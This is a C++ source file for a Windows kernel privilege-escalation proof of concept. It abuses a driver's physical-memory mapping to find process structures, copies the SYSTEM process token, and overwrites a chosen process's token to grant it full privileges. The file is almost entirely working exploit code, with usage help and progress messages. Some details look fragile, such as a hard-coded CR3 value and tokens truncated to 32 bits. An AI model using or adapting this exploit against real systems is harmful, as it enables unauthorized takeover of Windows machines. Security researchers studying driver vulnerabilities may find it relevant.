#include "WinDE.h"
#include <Windows.h>
#include <stdio.h>
#include <errno.h>

/*	thanks back.engineering	*/
#pragma pack (push, 1)

struct PhysicalMemoryPage//CM_PARTIAL_RESOURCE_DESCRIPTOR
{
	uint8_t type;
	uint8_t shareDisposition;
	uint16_t flags;
	uint64_t pBegin;
	uint32_t sizeButNotExactly;
	uint32_t pad;

	static constexpr uint16_t cm_resource_memory_large_40{ 0x200 };
	static constexpr uint16_t cm_resource_memory_large_48{ 0x400 };
	static constexpr uint16_t cm_resource_memory_large_64{ 0x800 };

	uint64_t size()const noexcept
	{
		if (flags & cm_resource_memory_large_40)
			return uint64_t{ sizeButNotExactly } << 8;
		else if (flags & cm_resource_memory_large_48)
			return uint64_t{ sizeButNotExactly } << 16;
		else if (flags & cm_resource_memory_large_64)
			return uint64_t{ sizeButNotExactly } << 32;
		else
			return uint64_t{ sizeButNotExactly };
	}
};
static_assert(sizeof(PhysicalMemoryPage) == 20, "PhysicalMemoryPage needs to be 20 size");
#pragma pack (pop)

std::map<uintptr_t, size_t> physmem_ranges{};

void InitPhysMemRanges()
{
	HKEY hkey;
	DWORD type, size;
	LPBYTE data;

	RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory", 0, KEY_READ, &hkey);
	RegQueryValueExA(hkey, ".Translated", NULL, &type, NULL, &size); //get size
	
	data = new uint8_t[size];
	
	RegQueryValueExA(hkey, ".Translated", NULL, &type, data, &size);
	DWORD count = *(DWORD*)(data + 16);
	auto pmi = data + 24;

	for (int dwIndex = 0; dwIndex < count; dwIndex++)
	{
#if 0
		pmem_ranges.emplace(*(uint64_t*)(pmi + 0), *(uint64_t*)(pmi + 8));
#else
		auto page = (PhysicalMemoryPage*)(pmi - 4);
		physmem_ranges.emplace(page->pBegin, page->size());
#endif

		std::cout << "page->pBegin " << std::hex << page->pBegin << "\n";
		pmi += 20;
	}
	delete[] data;
	RegCloseKey(hkey);

	Sleep(3000);
	return;
}

LONG WINAPI OurCrashHandler(EXCEPTION_POINTERS* /*ExceptionInfo*/)
{
	std::cout << "Gotcha!" << std::endl;
	Sleep(8000);

	return EXCEPTION_CONTINUE_SEARCH;
}

int main(int argc, char** argv)
{
	SetUnhandledExceptionFilter(OurCrashHandler);

	std::cout << "driver privilege escalation PoC ###\n";

	HANDLE dev_handle = OpenDevice(DEVICE_NAME);

	if (argc < 2)
	{
		printf("you need to supply the PID of process to escalate! \n");
	}

	if (get_help_opt(argc, argv) != NULL)
	{
		printf("\n");
		printf("Usage:\n\n");

		printf("  %s [-userPID 1234] \n\n", argv[0]);
		printf("	-userPID	: PID of the process to elevate the privileges (default : current process)\n");
		printf("\n");
		return 1;
	}

	DWORDLONG user_pid = get_user_pid_opt(argc, argv);

	// PID of the privileged process to steal the token from (4 by default which is the "System" process)
	int32_t system_pid = 4;
	//DWORDLONG system_pid = 4;
	// 
	// this variable will contain the stolen token value
	int32_t stolen_token = 0;

	// this will contain the ptr to the EPROCESS token of the targeted process (current process by default)
	uint64_t current_token_ptr = 0;

	// This is the input buffer used to communicate with the driver
	auto inBuffer = new MapIoCmd;

	inBuffer->chunk_num = 8;
	inBuffer->chunk_size = 4;

	// mapped_address will hold the pointer to the mapped kernel memory
	uint8_t* mapped_address;
	InitPhysMemRanges();
	for (auto& range : physmem_ranges)
	{
		for (UINT64 phys_addr_iterator = range.first; phys_addr_iterator < range.first + range.second; phys_addr_iterator = phys_addr_iterator + BUFF_SIZE)
		{
			// setup phys_addr_iterator
			inBuffer->address = phys_addr_iterator;


			// talk with driver
			mapped_address = MapMemory(dev_handle, inBuffer);

			if (mapped_address == NULL)
			{
				continue;
			}

			// print debug message from time to time
			if (phys_addr_iterator % 0x1000000 == 0) printf("# Currently scanning : 0x%016I64X\n\n", phys_addr_iterator);

			uintptr_t eproc_addr = NULL;

			// iterate on the currently mapped blob
			for (uintptr_t current_blob_iterator = 0; current_blob_iterator < BUFF_SIZE - 0x200; current_blob_iterator = current_blob_iterator + 0x10)
			{
				// temporary ptr to currently searched blob
				auto current_blob_ptr = (uint32_t*)(mapped_address + current_blob_iterator);

				// just in case, check if we can read the memory
				if (IsBadReadPtr(current_blob_ptr, 4) == 0 && IsBadReadPtr(current_blob_ptr + 0x30, 8) == 0)
				{
					std::cout << "Read blob is valid so far \n";

					auto possible_eproc_pooltag = *(uint32_t*)(current_blob_ptr + 4);

					// "Proc" pooltag	

					if (possible_eproc_pooltag != 0x636f7250)
					{
						continue;
					}

					for (uint32_t blob_offset = 0; blob_offset < 0x200; ++blob_offset)
					{
						uintptr_t possible_cr3 = *(uint32_t*)(current_blob_ptr + blob_offset);

						if (possible_cr3 == 0x1ad000)
						{
							/*	found an eprocess	*/
							eproc_addr = (uintptr_t)current_blob_ptr + blob_offset;
							break;
						}
					}

					continue;
				}

			}
			if (eproc_addr)
			{
				printf("\tFOUND \"Proc\" tagged pool!\n\n");
				printf("\t\tProcess name : ");
				for (int i = 0; i < 15; i++)
				{
					std::cout << (*(char*)(eproc_addr + OFFSET::IMAGEFILENAME + i));
				}
				std::cout << "\n";

				auto process_id = *(uint32_t*)(eproc_addr + OFFSET::UNIQUEPROCESSID);

				printf("\n");
				printf("\t\tPID : %i\n", process_id);
				printf("\t\tTOKEN : 0x%08I64X\n", *(DWORD*)(eproc_addr + OFFSET::TOKEN));
				printf("\n");
				Sleep(5000);

				// Is this our current process we are looking for? (we first check if we found it already)
				if (current_token_ptr == NULL && process_id == user_pid)
				{
					printf("\t\tFOUND current process! (storing address for later)\n\n");
					current_token_ptr = phys_addr_iterator + eproc_addr + OFFSET::TOKEN;
				}

				// Is this the privileged process we are looking for ? (we first check if we found it already)
				if (stolen_token == NULL && process_id == system_pid)
				{
					printf("\t\tFOUND privileged token! (saving token for later)\n\n");
					stolen_token = *(DWORD*)(eproc_addr + OFFSET::TOKEN);
				}

				// Do we have all we need to privesc ?
				if (stolen_token != NULL && current_token_ptr != NULL)
				{
					inBuffer->address = current_token_ptr;
					mapped_address = (uint8_t*)MapMemory(dev_handle, inBuffer);
					printf("Overwriting token of targeted process\n");
					printf("OLD TOKEN : 0x%08I64X\n", *(DWORD*)mapped_address);
					*(DWORD*)mapped_address = stolen_token;
					printf("NEW TOKEN : 0x%08I64X\n", *(DWORD*)mapped_address);
					printf("Enjoy your privileged shell!\n");
					return 0;
				}

			}
		
		}
	}

	printf("Exploit finished but the privilege escalation did not succeed.\n");

	system("pause");
	CloseHandle(dev_handle);
;
	return 0;
}